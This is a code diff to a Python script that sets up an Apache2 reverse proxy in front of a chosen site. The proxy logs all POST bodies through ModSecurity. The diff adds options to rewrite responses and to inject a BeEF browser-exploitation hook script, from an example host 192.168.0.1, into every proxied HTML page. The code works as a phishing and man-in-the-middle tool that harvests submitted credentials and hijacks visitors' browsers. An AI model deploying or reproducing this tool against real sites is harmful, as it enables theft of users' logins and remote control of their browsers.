@@ -71,6 +71,12 @@ class Base:
         if not self.check_file_exist("/etc/apache2/mods-available/ssl.load"):
             print self.c_error + "Apache2 module: mod_ssl not installed!"
             exit(1)
+        if not self.check_file_exist("/etc/apache2/mods-available/substitute.load"):
+            print self.c_error + "Apache2 module: mod_substitute not installed!"
+            exit(1)
+        if not self.check_file_exist("/etc/apache2/mods-available/headers.load"):
+            print self.c_error + "Apache2 module: mod_headers not installed!"
+            exit(1)
 
     def check_enabled_modules(self):
         if not self.check_file_exist("/etc/apache2/mods-enabled/proxy.load"):
@@ -93,6 +99,14 @@ class Base:
             print self.c_error + "Apache2 module: mod_ssl not enabled!"
             print self.c_info + "Enable: a2enmod ssl"
             os.system("a2enmod ssl > /dev/null 2>&1")
+        if not self.check_file_exist("/etc/apache2/mods-enabled/substitute.load"):
+            print self.c_error + "Apache2 module: mod_substitute not enabled!"
+            print self.c_info + "Enable: a2enmod substitute"
+            os.system("a2enmod substitute > /dev/null 2>&1")
+        if not self.check_file_exist("/etc/apache2/mods-enabled/headers.load"):
+            print self.c_error + "Apache2 module: mod_headers not enabled!"
+            print self.c_info + "Enable: a2enmod headers"
+            os.system("a2enmod headers > /dev/null 2>&1")
 
 
 if __name__ == "__main__":
@@ -116,6 +130,10 @@ if __name__ == "__main__":
     parser.add_argument('-O', '--organization', type=str, help='Set Organization for SSL cert')
     parser.add_argument('-U', '--organization_unit', type=str, help='Set Organization unit for SSL cert (default: IT)',
                         default='IT')
+    parser.add_argument('-r', '--replace', type=str,
+                        help='Find and replace string in response (example: "s|foo|bar|ni")', default=None)
+    parser.add_argument('-b', '--beef', type=str,
+                        help='Set path to BeeF script (example: "http://192.168.0.1/beef.js")', default=None)
     parser.add_argument('-c', '--http_config', type=str,
                         help='Set path to Apache2 http site config '
                              '(default: /etc/apache2/sites-available/000-default.conf)',
@@ -158,24 +176,40 @@ if __name__ == "__main__":
     if args.organization is None:
         args.organization = domain
 
-    if schema == "http":
-        with open(args.http_config, "a") as http_config_file:
-            http_config_file.write("\n\n<VirtualHost *:80>" +
-                                   "\n\tServerName " + domain +
-                                   "\n\tServerAdmin admin@" + domain +
-                                   "\n\tProxyPass \"/\" \"" + args.url + "/\"" +
-                                   "\n\tProxyPassReverse \"/\" \"" + args.url + "/\"" +
-                                   "\n\tSecRuleEngine On" +
-                                   "\n\tSecAuditEngine on" +
-                                   "\n\tSecAuditLog ${APACHE_LOG_DIR}/http." + domain + "-audit.log" +
-                                   "\n\tErrorLog ${APACHE_LOG_DIR}/http." + domain + "-error.log" +
-                                   "\n\tCustomLog ${APACHE_LOG_DIR}/http." + domain + "-access.log combined" +
-                                   "\n\tSecRequestBodyAccess on" +
-                                   "\n\tSecAuditLogParts ABIFHZ" +
-                                   "\n\tSecDefaultAction \"nolog,noauditlog,allow,phase:2\"" +
-                                   "\n\tSecRule REQUEST_METHOD \"^POST$\" \"chain,allow,phase:2,id:123\"" +
-                                   "\n\tSecRule REQUEST_URI \".*\" \"auditlog\"" +
-                                   "\n</VirtualHost>\n")
+    with open(args.http_config, "a") as http_config_file:
+        http_config_file.write("\n\n<VirtualHost *:80>" +
+                               "\n\tServerName " + domain +
+                               "\n\tServerAdmin admin@" + domain +
+                               "\n\tProxyPass \"/\" \"" + args.url + "/\"" +
+                               "\n\tProxyPassReverse \"/\" \"" + args.url + "/\"")
+
+        if args.replace is not None or args.beef is not None:
+            http_config_file.write("\n\tRequestHeader unset Accept-Encoding" +
+                                   "\n\tRequestHeader set Accept-Encoding identity" +
+                                   "\n\tAddOutputFilterByType SUBSTITUTE text/html")
+
+        if args.replace is not None:
+            http_config_file.write("\n\tSubstitute \"" + args.replace + "\"")
+
+        if args.beef is not None:
+            http_config_file.write("\n\tSubstitute \"s|</head>|<script src='" +
+                                   args.beef + "'></script></head>|ni\"")
+
+        http_config_file.write("\n\tSecRuleEngine On" +
+                               "\n\tSecAuditEngine on" +
+                               "\n\tSecAuditLog ${APACHE_LOG_DIR}/http." + domain + "-audit.log" +
+                               "\n\tErrorLog ${APACHE_LOG_DIR}/http." + domain + "-error.log" +
+                               "\n\tCustomLog ${APACHE_LOG_DIR}/http." + domain + "-access.log combined" +
+                               "\n\tSecRequestBodyAccess on" +
+                               "\n\tSecAuditLogParts ABIFHZ" +
+                               "\n\tSecDefaultAction \"nolog,noauditlog,allow,phase:2\"" +
+                               "\n\tSecRule REQUEST_METHOD \"^POST$\" \"chain,allow,phase:2,id:123\"" +
+                               "\n\tSecRule REQUEST_URI \".*\" \"auditlog\"")
+
+        if schema == "https":
+            http_config_file.write("\n\tSSLProxyEngine On")
+
+        http_config_file.write("\n</VirtualHost>\n")
 
     if schema == "https":
         print Base.c_info + "Create SSL cert and key ..."
@@ -194,33 +228,27 @@ if __name__ == "__main__":
             print Base.c_error + "Can not create SSL cert and key"
             exit(1)
 
-        with open(args.http_config, "a") as http_config_file:
-            http_config_file.write("\n\n<VirtualHost *:80>" +
-                                   "\n\tServerName " + domain +
-                                   "\n\tServerAdmin admin@" + domain +
-                                   "\n\tProxyPass \"/\" \"" + args.url + "/\"" +
-                                   "\n\tProxyPassReverse \"/\" \"" + args.url + "/\"" +
-                                   "\n\tSecRuleEngine On" +
-                                   "\n\tSecAuditEngine on" +
-                                   "\n\tSecAuditLog ${APACHE_LOG_DIR}/http." + domain + "-audit.log" +
-                                   "\n\tErrorLog ${APACHE_LOG_DIR}/http." + domain + "-error.log" +
-                                   "\n\tCustomLog ${APACHE_LOG_DIR}/http." + domain + "-access.log combined" +
-                                   "\n\tSecRequestBodyAccess on" +
-                                   "\n\tSecAuditLogParts ABIFHZ" +
-                                   "\n\tSecDefaultAction \"nolog,noauditlog,allow,phase:2\"" +
-                                   "\n\tSecRule REQUEST_METHOD \"^POST$\" \"chain,allow,phase:2,id:123\"" +
-                                   "\n\tSecRule REQUEST_URI \".*\" \"auditlog\"" +
-                                   "\n\tSSLProxyEngine On" +
-                                   "\n</VirtualHost>\n")
-
         with open(args.https_config, "a") as https_config_file:
             https_config_file.write("\n\n<IfModule mod_ssl.c>" +
                                     "\n\t<VirtualHost _default_:443>" +
                                     "\n\t\tServerName " + domain +
                                     "\n\t\tServerAdmin admin@" + domain +
                                     "\n\t\tProxyPass \"/\" \"" + args.url + "/\"" +
-                                    "\n\t\tProxyPassReverse \"/\" \"" + args.url + "/\"" +
-                                    "\n\t\tSecRuleEngine On" +
+                                    "\n\t\tProxyPassReverse \"/\" \"" + args.url + "/\"")
+
+            if args.replace is not None or args.beef is not None:
+                https_config_file.write("\n\t\tRequestHeader unset Accept-Encoding" +
+                                        "\n\t\tRequestHeader set Accept-Encoding identity" +
+                                        "\n\t\tAddOutputFilterByType SUBSTITUTE text/html")
+
+            if args.replace is not None:
+                https_config_file.write("\n\t\tSubstitute \"" + args.replace + "\"")
+
+            if args.beef is not None:
+                https_config_file.write("\n\t\tSubstitute \"s|</head>|<script src='" +
+                                        args.beef + "'></script></head>|ni\"")
+
+            https_config_file.write("\n\t\tSecRuleEngine On" +
                                     "\n\t\tSecAuditEngine on" +
                                     "\n\t\tSecAuditLog ${APACHE_LOG_DIR}/https." + domain + "-audit.log" +
                                     "\n\t\tErrorLog ${APACHE_LOG_DIR}/https." + domain + "-error.log" +
@@ -237,16 +265,20 @@ if __name__ == "__main__":
                                     "\n\t</VirtualHost>" +
                                     "\n</IfModule>\n")
 
-    print Base.c_info + "Restart Apache2 server"
-    os.system("/etc/init.d/apache2 restart")
+    if schema == "http":
+        with open(args.http_config, "r") as http_config_file:
+            print Base.c_info + "Config: " + args.http_config + ": "
+            print http_config_file.read()
 
-    with open(args.http_config, "r") as http_config_file:
-        print Base.c_info + "Config: " + args.http_config + ": "
-        print http_config_file.read()
-
-    with open(args.https_config, "r") as https_config_file:
-        print Base.c_info + "Config: " + args.https_config + ": "
-        print https_config_file.read()
+    if schema == "https":
+        with open(args.http_config, "r") as http_config_file:
+            print Base.c_info + "Config: " + args.http_config + ": "
+            print http_config_file.read()
+        with open(args.https_config, "r") as https_config_file:
+            print Base.c_info + "Config: " + args.https_config + ": "
+            print https_config_file.read()
 
     print Base.c_info + "Apache2 http sites config: " + args.http_config
     print Base.c_info + "Apache2 https sites config: " + args.https_config
+    print Base.c_info + "Restart Apache2 server"
+    os.system("/etc/init.d/apache2 restart")
